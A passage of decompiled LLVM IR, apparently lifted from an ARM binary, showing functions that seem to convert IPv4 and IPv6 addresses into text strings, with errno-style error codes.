  %v0_1b5b8 = phi i32 [ 1, %dec_label_pc_1b5ac.preheader ], [ %v0_1b5ac.pre, %dec_label_pc_1b5a0 ]
  %v2_1b5ac = sub i32 %v0_1b5b8, %v1_1b5b0
  %v4_1b5ac = xor i32 %v0_1b5b8, %v1_1b5b0
  %v5_1b5ac = xor i32 %v2_1b5ac, %v0_1b5b8
  %v6_1b5ac = and i32 %v5_1b5ac, %v4_1b5ac
  %v7_1b5ac = icmp slt i32 %v6_1b5ac, 0
  %v8_1b5ac = icmp slt i32 %v2_1b5ac, 0
  %v9_1b5ac = icmp eq i32 %v0_1b5b8, %v1_1b5b0
  %v2_1b5b0 = sub i32 %v1_1b5b0, %v0_1b5b8
  store i32 %v2_1b5b0, i32* %r1.global-to-local, align 4
  %v1_1b5b8 = add i32 %v0_1b5b8, 1
  store i32 %v1_1b5b8, i32* %r2.global-to-local, align 4
  %v3_1b5bc = xor i1 %v8_1b5ac, %v7_1b5ac
  %v4_1b5bc = or i1 %v9_1b5ac, %v3_1b5bc
  br i1 %v4_1b5bc, label %dec_label_pc_1b5a0, label %dec_label_pc_1b5c0

dec_label_pc_1b5c0:                               ; preds = %dec_label_pc_1b5ac
  store i32 %v0_1b5c0, i32* @r4, align 4
  br label %dec_label_pc_1b5c4

dec_label_pc_1b5c4:                               ; preds = %dec_label_pc_1b580, %dec_label_pc_1b5c0
  %v0_1b5c4 = phi i32 [ %v0_1b5c0, %dec_label_pc_1b5c0 ], [ %v0_1b5c4.pre, %dec_label_pc_1b580 ]
  %v1_1b5c4 = phi i32 [ %v0_1b5c0, %dec_label_pc_1b5c0 ], [ %v1_1b5c4.pre, %dec_label_pc_1b580 ]
  %v9_1b5c4 = icmp eq i32 %v0_1b5c4, %v1_1b5c4
  br i1 %v9_1b5c4, label %dec_label_pc_1b5cc, label %dec_label_pc_1b5e4

dec_label_pc_1b5cc:                               ; preds = %dec_label_pc_1b5c4
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1b434, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1b5d8 = call i32 @function_14000()
  br label %dec_label_pc_1b5fc

dec_label_pc_1b5e4:                               ; preds = %dec_label_pc_1b49c, %dec_label_pc_1b4c8, %dec_label_pc_1b4e8, %dec_label_pc_1b4dc, %dec_label_pc_1b588, %dec_label_pc_1b52c, %dec_label_pc_1b518, %dec_label_pc_1b5c4, %dec_label_pc_1b458, %dec_label_pc_1b560, %dec_label_pc_1b520
  br label %dec_label_pc_1b5fc

dec_label_pc_1b5ec:                               ; preds = %dec_label_pc_1b418
  %v0_1b5ec = call i32 @function_12b24()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1b5f4 = inttoptr i32 %v0_1b5ec to i32*
  store i32 97, i32* %v2_1b5f4, align 4
  br label %dec_label_pc_1b5fc

dec_label_pc_1b5fc:                               ; preds = %dec_label_pc_1b5e4, %dec_label_pc_1b5cc, %dec_label_pc_1b424, %dec_label_pc_1b5ec
  %v1_1b604 = phi i32 [ 0, %dec_label_pc_1b5e4 ], [ 1, %dec_label_pc_1b5cc ], [ %v3_1b42c, %dec_label_pc_1b424 ], [ -1, %dec_label_pc_1b5ec ]
  store i32 %v3_1b3f8, i32* @r4, align 4
  store i32 %v6_1b3f8, i32* @r5, align 4
  store i32 %v9_1b3f8, i32* @r6, align 4
  store i32 %v12_1b3f8, i32* @r7, align 4
  store i32 %v27_1b3f8, i32* @lr, align 4
  ret i32 %v1_1b604

; uselistorder directives
  uselistorder i32 %v2_1b5b0, { 1, 0 }
  uselistorder i32 %v2_1b5ac, { 1, 0 }
  uselistorder i32 %v0_1b5b8, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1b5b0, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1b5c0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1b5c4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1b5c4.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1b570, { 1, 0 }
  uselistorder i32 %v0_1b558.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1b548, { 1, 0 }
  uselistorder i32 %v0_1b520, { 1, 0, 2 }
  uselistorder i32 %v3_1b4f4, { 1, 0 }
  uselistorder i32 %v0_1b4e8, { 1, 0, 2 }
  uselistorder i32 %v1_1b494, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1b470, { 1, 0 }
  uselistorder i8** %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @function_1b328, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1b5fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1b5e4, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1b5c4, { 1, 0 }
  uselistorder label %dec_label_pc_1b5ac, { 1, 0 }
  uselistorder label %dec_label_pc_1b580, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1b548.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b484, { 1, 0 }
}

define i32 @function_1b614(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1b614:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1b614 = load i32, i32* @r4, align 4
  %v12_1b614 = load i32, i32* @r7, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1b6ec = ptrtoint i32* %stack_var_-40 to i32
  %v2_1b6cc = add i32 %v2_1b6ec, -17
  br label %dec_label_pc_1b6ec

dec_label_pc_1b63c:                               ; preds = %dec_label_pc_1b6ec
  %v0_1b63c = load i32, i32* %fp.global-to-local, align 4
  %v2_1b63c = add i32 %v0_1b63c, %v1_1b63c
  %v3_1b63c = inttoptr i32 %v2_1b63c to i8*
  %v4_1b63c = load i8, i8* %v3_1b63c, align 1
  %v6_1b63c = zext i8 %v4_1b63c to i32
  store i32 %v6_1b63c, i32* @r4, align 4
  store i32 %v6_1b63c, i32* @r0, align 4
  %v0_1b644 = call i32 @function_12418()
  store i32 %v0_1b644, i32* %r0.global-to-local, align 4
  %v1_1b648 = add i32 %v0_1b644, 48
  %v1_1b64c = trunc i32 %v1_1b648 to i8
  %v2_1b64c = load i32, i32* %r5.global-to-local, align 4
  %v3_1b64c = add i32 %v2_1b64c, -17
  %v4_1b64c = inttoptr i32 %v3_1b64c to i8*
  store i8 %v1_1b64c, i8* %v4_1b64c, align 1
  %v0_1b650 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b650 = add i32 %v0_1b650, -17
  %v2_1b650 = inttoptr i32 %v1_1b650 to i8*
  %v3_1b650 = load i8, i8* %v2_1b650, align 1
  %v0_1b654 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b654 = add i32 %v0_1b654, 1
  store i32 %v1_1b654, i32* %r6.global-to-local, align 4
  store i32 %v2_1b6ec, i32* %r2.global-to-local, align 4
  %v7_1b65c = icmp eq i8 %v3_1b650, 48
  store i32 10, i32* @r1, align 4
  %v0_1b664 = load i32, i32* @r4, align 4
  store i32 %v0_1b664, i32* @r0, align 4
  %v2_1b668 = add i32 %v1_1b654, %v2_1b6ec
  store i32 %v2_1b668, i32* %r8.global-to-local, align 4
  %v0_1b66c = load i32, i32* %fp.global-to-local, align 4
  %v1_1b66c = load i32, i32* %sl.global-to-local, align 4
  %v2_1b66c = add i32 %v1_1b66c, %v0_1b66c
  store i32 %v2_1b66c, i32* %sb.global-to-local, align 4
  %v0_1b674 = call i32 @function_12418()
  %v1_1b67c = urem i32 %v0_1b674, 256
  store i32 %v1_1b67c, i32* %r0.global-to-local, align 4
  %v2_1b680 = call i32 @function_12514(i32 %v1_1b67c, i32 10)
  store i32 %v2_1b680, i32* %r0.global-to-local, align 4
  br i1 %v7_1b65c, label %dec_label_pc_1b674, label %dec_label_pc_1b69c

dec_label_pc_1b674:                               ; preds = %dec_label_pc_1b63c
  %v1_1b690 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v1_1b690, i32* @r7, align 4
  %v2_1b694 = load i32, i32* %r5.global-to-local, align 4
  %v3_1b694 = add i32 %v2_1b694, -17
  %v4_1b694 = inttoptr i32 %v3_1b694 to i8*
  store i8 58, i8* %v4_1b694, align 1
  br label %dec_label_pc_1b6b8

dec_label_pc_1b69c:                               ; preds = %dec_label_pc_1b63c
  %v2_1b6b0 = load i32, i32* %r8.global-to-local, align 4
  %v3_1b6b0 = add i32 %v2_1b6b0, -17
  %v4_1b6b0 = inttoptr i32 %v3_1b6b0 to i8*
  store i8 58, i8* %v4_1b6b0, align 1
  %v0_1b6b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b6b4 = add i32 %v0_1b6b4, 1
  store i32 %v1_1b6b4, i32* @r7, align 4
  br label %dec_label_pc_1b6b8

dec_label_pc_1b6b8:                               ; preds = %dec_label_pc_1b674, %dec_label_pc_1b69c
  %v0_1b6b8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1b6b8 = inttoptr i32 %v0_1b6b8 to i8*
  %v2_1b6b8 = load i8, i8* %v1_1b6b8, align 1
  %v3_1b6b8 = zext i8 %v2_1b6b8 to i32
  store i32 %v3_1b6b8, i32* %r0.global-to-local, align 4
  %v2_1b6c0 = call i32 @function_12514(i32 %v3_1b6b8, i32 10)
  store i32 %v2_1b6ec, i32* %ip.global-to-local, align 4
  %v0_1b6c8 = load i32, i32* @r7, align 4
  %v1_1b6c8 = add i32 %v0_1b6c8, 1
  store i32 %v1_1b6c8, i32* %r0.global-to-local, align 4
  %v3_1b6d4 = add i32 %v2_1b6cc, %v0_1b6c8
  %v4_1b6d4 = inttoptr i32 %v3_1b6d4 to i8*
  store i8 58, i8* %v4_1b6d4, align 1
  %v0_1b6d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b6d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b6d8 = add i32 %v1_1b6d8, %v0_1b6d8
  store i32 %v2_1b6d8, i32* %r2.global-to-local, align 4
  %v3_1b6e0 = add i32 %v2_1b6d8, -17
  %v4_1b6e0 = inttoptr i32 %v3_1b6e0 to i8*
  store i8 46, i8* %v4_1b6e0, align 1
  %v0_1b6e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b6e4 = add i32 %v0_1b6e4, 1
  store i32 %v1_1b6e4, i32* %r6.global-to-local, align 4
  %v0_1b6e8 = load i32, i32* %sl.global-to-local, align 4
  %v1_1b6e8 = add i32 %v0_1b6e8, 1
  store i32 %v1_1b6e8, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b6ec

dec_label_pc_1b6ec:                               ; preds = %dec_label_pc_1b614, %dec_label_pc_1b6b8
  %v0_1b6f8 = phi i32 [ 0, %dec_label_pc_1b614 ], [ %v1_1b6e4, %dec_label_pc_1b6b8 ]
  %v1_1b63c = phi i32 [ 0, %dec_label_pc_1b614 ], [ %v1_1b6e8, %dec_label_pc_1b6b8 ]
  store i32 %v2_1b6ec, i32* %ip.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_1b6f8, i32* @r7, align 4
  %v2_1b6fc = add i32 %v0_1b6f8, %v2_1b6ec
  store i32 %v2_1b6fc, i32* %r5.global-to-local, align 4
  %v7_1b700 = icmp sgt i32 %v1_1b63c, 3
  br i1 %v7_1b700, label %dec_label_pc_1b704, label %dec_label_pc_1b63c

dec_label_pc_1b704:                               ; preds = %dec_label_pc_1b6ec
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1b708 = ptrtoint i32* %stack_var_-57 to i32
  %v3_1b70c = add i32 %v2_1b6fc, -18
  %v4_1b70c = inttoptr i32 %v3_1b70c to i8*
  store i8 0, i8* %v4_1b70c, align 1
  store i32 %v2_1b708, i32* @r0, align 4
  %v0_1b714 = call i32 @function_13f70()
  store i32 %v0_1b714, i32* %r0.global-to-local, align 4
  %v2_1b718 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1b718, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_1b714, %v2_1b718
  br i1 %tmp, label %dec_label_pc_1b724, label %dec_label_pc_1b738

dec_label_pc_1b724:                               ; preds = %dec_label_pc_1b704
  %v0_1b724 = call i32 @function_12b24()
  store i32 %v0_1b724, i32* %r0.global-to-local, align 4
  %v0_1b72c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1b72c, i32* %r2.global-to-local, align 4
  %v2_1b730 = inttoptr i32 %v0_1b724 to i32*
  store i32 28, i32* %v2_1b730, align 4
  %v0_1b748.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b748

dec_label_pc_1b738:                               ; preds = %dec_label_pc_1b704
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1b708, i32* @r1, align 4
  %v2_1b740 = inttoptr i32 %arg2 to i8*
  %v3_1b740 = call i32 @function_14210(i8* %v2_1b740, i32 %v2_1b708)
  store i32 %v3_1b740, i32* %r0.global-to-local, align 4
  store i32 %v3_1b740, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b748

dec_label_pc_1b748:                               ; preds = %dec_label_pc_1b724, %dec_label_pc_1b738
  %v0_1b748 = phi i32 [ %v0_1b748.pre, %dec_label_pc_1b724 ], [ %v3_1b740, %dec_label_pc_1b738 ]
  store i32 %v0_1b748, i32* %r0.global-to-local, align 4
  store i32 %v3_1b614, i32* @r4, align 4
  store i32 %v12_1b614, i32* @r7, align 4
  ret i32 %v0_1b748

; uselistorder directives
  uselistorder i32 %v0_1b748, { 1, 0 }
  uselistorder i32 %v2_1b708, { 1, 0, 2 }
  uselistorder i32 %v1_1b63c, { 1, 0 }
  uselistorder i32 %v1_1b67c, { 1, 0 }
  uselistorder i32 %v2_1b6ec, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 8, 5, 6, 7, 9, 11, 10, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32)* @function_12514, { 9, 8, 6, 4, 3, 2, 1, 0, 7, 5 }
  uselistorder i8 48, { 4, 2, 5, 6, 7, 8, 9, 0, 1, 10, 3 }
  uselistorder i32 ()* @function_12418, { 14, 13, 12, 10, 5, 4, 3, 2, 0, 11, 7, 9, 8, 1, 6 }
  uselistorder i32 -17, { 2, 3, 4, 5, 6, 0, 7, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1b748, { 1, 0 }
  uselistorder label %dec_label_pc_1b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1b6b8, { 1, 0 }
}

define i32 @function_1b758(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1b758:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1b758 = load i32, i32* @r5, align 4
  %v7_1b764 = icmp eq i32 %arg1, 2
  store i1 %v7_1b764, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1b764, label %dec_label_pc_1b788, label %dec_label_pc_1b77c

dec_label_pc_1b77c:                               ; preds = %dec_label_pc_1b758
  %v7_1b77c = icmp eq i32 %arg1, 10
  store i1 %v7_1b77c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b77c, label %dec_label_pc_1b79c, label %dec_label_pc_1b9b0

dec_label_pc_1b788:                               ; preds = %dec_label_pc_1b758
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1b794 = call i32 @function_1b614(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1b9a8

dec_label_pc_1b79c:                               ; preds = %dec_label_pc_1b77c
  %v2_1b79c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1b79c, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1b7a8 = bitcast i32* %stack_var_-72 to i8*
  %v3_1b7a8 = call i32 @function_13ed0(i8* %v2_1b7a8, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1b7cc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1b7b0

dec_label_pc_1b7b0:                               ; preds = %dec_label_pc_1b7b0.dec_label_pc_1b7b0_crit_edge, %dec_label_pc_1b79c
  %v0_1b7c8 = phi i32 [ %v0_1b7b0.pre, %dec_label_pc_1b7b0.dec_label_pc_1b7b0_crit_edge ], [ 0, %dec_label_pc_1b79c ]
  %v1_1b7b0 = load i32, i32* @r8, align 4
  %v2_1b7b0 = add i32 %v1_1b7b0, %v0_1b7c8
  %v3_1b7b4 = inttoptr i32 %v2_1b7b0 to i8*
  %v4_1b7b4 = load i8, i8* %v3_1b7b4, align 1
  %v6_1b7b4 = zext i8 %v4_1b7b4 to i32
  %v1_1b7b8 = add i32 %v2_1b7b0, 1
  %v2_1b7b8 = inttoptr i32 %v1_1b7b8 to i8*
  %v3_1b7b8 = load i8, i8* %v2_1b7b8, align 1
  %v4_1b7b8 = zext i8 %v3_1b7b8 to i32
  %tmp74 = icmp slt i32 %v0_1b7c8, 0
  %v4_1b7bc = zext i1 %tmp74 to i32
  %v5_1b7bc = add i32 %v4_1b7bc, %v0_1b7c8
  %v4_1b7c0 = mul nuw nsw i32 %v6_1b7b4, 256
  %v5_1b7c0 = or i32 %v4_1b7b8, %v4_1b7c0
  store i32 %v5_1b7c0, i32* %r2.global-to-local, align 4
  %v3_1b7c4 = sdiv i32 %v5_1b7bc, 2
  %v1_1b7c8 = add i32 %v0_1b7c8, 2
  store i32 %v1_1b7c8, i32* %r0.global-to-local, align 4
  %v4_1b7d0 = mul i32 %v3_1b7c4, 4
  %v5_1b7d0 = add i32 %v4_1b7d0, %v2_1b7cc
  %v7_1b7d4 = icmp eq i32 %v1_1b7c8, 15
  store i1 %v7_1b7d4, i1* %cpsr_z.global-to-local, align 1
  %v2_1b7d8 = add i32 %v5_1b7d0, -32
  %v3_1b7d8 = inttoptr i32 %v2_1b7d8 to i32*
  store i32 %v5_1b7c0, i32* %v3_1b7d8, align 4
  %v7_1b7dc = icmp sgt i32 %v1_1b7c8, 15
  br i1 %v7_1b7dc, label %dec_label_pc_1b7e0, label %dec_label_pc_1b7b0.dec_label_pc_1b7b0_crit_edge

dec_label_pc_1b7b0.dec_label_pc_1b7b0_crit_edge:  ; preds = %dec_label_pc_1b7b0
  %v0_1b7b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b7b0

dec_label_pc_1b7e0:                               ; preds = %dec_label_pc_1b7b0
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b7f8

dec_label_pc_1b7f8:                               ; preds = %dec_label_pc_1b7e0, %dec_label_pc_1b844
  %v0_1b838 = phi i32 [ -1, %dec_label_pc_1b7e0 ], [ %v0_1b86c, %dec_label_pc_1b844 ]
  %v0_1b828 = phi i32 [ -1, %dec_label_pc_1b7e0 ], [ %v0_1b858, %dec_label_pc_1b844 ]
  %v0_1b80c = phi i32 [ -1, %dec_label_pc_1b7e0 ], [ %v0_1b80c7, %dec_label_pc_1b844 ]
  %v0_1b844 = phi i32 [ 0, %dec_label_pc_1b7e0 ], [ %v1_1b844, %dec_label_pc_1b844 ]
  store i32 %v2_1b7cc, i32* @lr, align 4
  %v4_1b7fc = mul nuw nsw i32 %v0_1b844, 4
  %v5_1b7fc = add i32 %v4_1b7fc, %v2_1b7cc
  %v1_1b800 = add i32 %v5_1b7fc, -32
  %v2_1b800 = inttoptr i32 %v1_1b800 to i32*
  %v3_1b800 = load i32, i32* %v2_1b800, align 4
  %v2_1b804 = icmp eq i32 %v3_1b800, 0
  %v7_1b80c = icmp eq i32 %v0_1b80c, -1
  br i1 %v2_1b804, label %dec_label_pc_1b80c, label %dec_label_pc_1b820

dec_label_pc_1b80c:                               ; preds = %dec_label_pc_1b7f8
  br i1 %v7_1b80c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b80c
  store i32 %v0_1b844, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1b844

.thread:                                          ; preds = %dec_label_pc_1b80c
  %v1_1b818.pre = load i32, i32* @r4, align 4
  %v2_1b818 = add i32 %v1_1b818.pre, 1
  store i32 %v2_1b818, i32* @r4, align 4
  br label %dec_label_pc_1b844

dec_label_pc_1b820:                               ; preds = %dec_label_pc_1b7f8
  br i1 %v7_1b80c, label %dec_label_pc_1b844, label %dec_label_pc_1b828

dec_label_pc_1b828:                               ; preds = %dec_label_pc_1b820
  %v7_1b828 = icmp eq i32 %v0_1b828, -1
  %v0_1b83c.pre = load i32, i32* @r4, align 4
  %v1_1b830 = load i32, i32* @r7, align 4
  %v7_1b834 = icmp sgt i32 %v0_1b83c.pre, %v1_1b830
  %or.cond = or i1 %v7_1b828, %v7_1b834
  br i1 %or.cond, label %dec_label_pc_1b838, label %dec_label_pc_1b840

dec_label_pc_1b838:                               ; preds = %dec_label_pc_1b828
  store i32 %v0_1b838, i32* @r6, align 4
  store i32 %v0_1b83c.pre, i32* @r7, align 4
  br label %dec_label_pc_1b840

dec_label_pc_1b840:                               ; preds = %dec_label_pc_1b828, %dec_label_pc_1b838
  %v0_1b82812 = phi i32 [ %v0_1b838, %dec_label_pc_1b838 ], [ %v0_1b828, %dec_label_pc_1b828 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b844

dec_label_pc_1b844:                               ; preds = %bb, %.thread, %dec_label_pc_1b820, %dec_label_pc_1b840
  %v0_1b86c = phi i32 [ %v0_1b838, %.thread ], [ %v0_1b844, %bb ], [ %v0_1b838, %dec_label_pc_1b820 ], [ -1, %dec_label_pc_1b840 ]
  %v0_1b80c7 = phi i32 [ %v0_1b80c, %.thread ], [ %v0_1b844, %bb ], [ -1, %dec_label_pc_1b820 ], [ -1, %dec_label_pc_1b840 ]
  %v0_1b858 = phi i32 [ %v0_1b828, %.thread ], [ %v0_1b828, %bb ], [ %v0_1b828, %dec_label_pc_1b820 ], [ %v0_1b82812, %dec_label_pc_1b840 ]
  %v1_1b844 = add nuw nsw i32 %v0_1b844, 1
  %v7_1b84c = icmp slt i32 %v1_1b844, 8
  br i1 %v7_1b84c, label %dec_label_pc_1b7f8, label %dec_label_pc_1b850

dec_label_pc_1b850:                               ; preds = %dec_label_pc_1b844
  %v7_1b850 = icmp eq i32 %v0_1b86c, -1
  store i1 %v7_1b850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b850, label %dec_label_pc_1b850.dec_label_pc_1b870_crit_edge, label %dec_label_pc_1b858

dec_label_pc_1b850.dec_label_pc_1b870_crit_edge:  ; preds = %dec_label_pc_1b850
  %v1_1b894.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b870

dec_label_pc_1b858:                               ; preds = %dec_label_pc_1b850
  %v7_1b858 = icmp eq i32 %v0_1b858, -1
  store i1 %v7_1b858, i1* %cpsr_z.global-to-local, align 1
  %v0_1b868.pre = load i32, i32* @r4, align 4
  br i1 %v7_1b858, label %dec_label_pc_1b868, label %dec_label_pc_1b860

dec_label_pc_1b860:                               ; preds = %dec_label_pc_1b858
  %v1_1b860 = load i32, i32* @r7, align 4
  %v9_1b860 = icmp eq i32 %v0_1b868.pre, %v1_1b860
  store i1 %v9_1b860, i1* %cpsr_z.global-to-local, align 1
  %v7_1b864 = icmp sgt i32 %v0_1b868.pre, %v1_1b860
  br i1 %v7_1b864, label %dec_label_pc_1b868, label %dec_label_pc_1b870

dec_label_pc_1b868:                               ; preds = %dec_label_pc_1b858, %dec_label_pc_1b860
  store i32 %v0_1b868.pre, i32* @r7, align 4
  store i32 %v0_1b86c, i32* @r6, align 4
  br label %dec_label_pc_1b870

dec_label_pc_1b870:                               ; preds = %dec_label_pc_1b850.dec_label_pc_1b870_crit_edge, %dec_label_pc_1b860, %dec_label_pc_1b868
  %v1_1b894.pre = phi i32 [ %v1_1b860, %dec_label_pc_1b860 ], [ %v1_1b894.pre.pre, %dec_label_pc_1b850.dec_label_pc_1b870_crit_edge ], [ %v0_1b868.pre, %dec_label_pc_1b868 ]
  %v0_1b870 = phi i32 [ %v0_1b858, %dec_label_pc_1b860 ], [ %v0_1b858, %dec_label_pc_1b850.dec_label_pc_1b870_crit_edge ], [ %v0_1b86c, %dec_label_pc_1b868 ]
  %v7_1b870 = icmp eq i32 %v0_1b870, -1
  store i1 %v7_1b870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b870, label %dec_label_pc_1b870._crit_edge, label %dec_label_pc_1b878

dec_label_pc_1b878:                               ; preds = %dec_label_pc_1b870
  %v7_1b878 = icmp eq i32 %v1_1b894.pre, 1
  store i1 %v7_1b878, i1* %cpsr_z.global-to-local, align 1
  %v7_1b87c = icmp slt i32 %v1_1b894.pre, 2
  br i1 %v7_1b87c, label %bb54, label %dec_label_pc_1b870._crit_edge

bb54:                                             ; preds = %dec_label_pc_1b878
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1b870._crit_edge

dec_label_pc_1b870._crit_edge:                    ; preds = %dec_label_pc_1b870, %dec_label_pc_1b878, %bb54
  %v0_1b894 = phi i32 [ %v0_1b870, %dec_label_pc_1b878 ], [ -1, %bb54 ], [ %v0_1b870, %dec_label_pc_1b870 ]
  %v2_1b884 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1b884, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_23cc0.1087 to i32), i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1b894 = add i32 %v0_1b894, %v1_1b894.pre
  store i32 %v2_1b894, i32* @sl, align 4
  %v9_1b8f4 = icmp eq i32 %tmp, 65535
  %v7_1b89c68 = icmp eq i32 %v0_1b894, -1
  store i1 %v7_1b89c68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b89c

dec_label_pc_1b89c:                               ; preds = %dec_label_pc_1b870._crit_edge, %dec_label_pc_1b94c
  %v7_1b89c72 = phi i1 [ %v7_1b89c68, %dec_label_pc_1b870._crit_edge ], [ %v7_1b89c, %dec_label_pc_1b94c ]
  %v0_1b8c871 = phi i32 [ 0, %dec_label_pc_1b870._crit_edge ], [ %v1_1b94c, %dec_label_pc_1b94c ]
  %v1_1b8b470 = phi i32 [ %v0_1b894, %dec_label_pc_1b870._crit_edge ], [ %v0_1b89c.pre, %dec_label_pc_1b94c ]
  %v2_1b8cc69 = phi i32 [ %v2_1b884, %dec_label_pc_1b870._crit_edge ], [ %v3_1b8b829, %dec_label_pc_1b94c ]
  br i1 %v7_1b89c72, label %dec_label_pc_1b8c0, label %dec_label_pc_1b8a4

dec_label_pc_1b8a4:                               ; preds = %dec_label_pc_1b89c
  %v9_1b8a4 = icmp eq i32 %v0_1b8c871, %v1_1b8b470
  store i1 %v9_1b8a4, i1* %cpsr_z.global-to-local, align 1
  %v5_1b8a8 = icmp slt i32 %v0_1b8c871, %v1_1b8b470
  br i1 %v5_1b8a8, label %dec_label_pc_1b8c0, label %dec_label_pc_1b8ac

dec_label_pc_1b8ac:                               ; preds = %dec_label_pc_1b8a4
  %v1_1b8ac = load i32, i32* @sl, align 4
  %v9_1b8ac = icmp eq i32 %v0_1b8c871, %v1_1b8ac
  store i1 %v9_1b8ac, i1* %cpsr_z.global-to-local, align 1
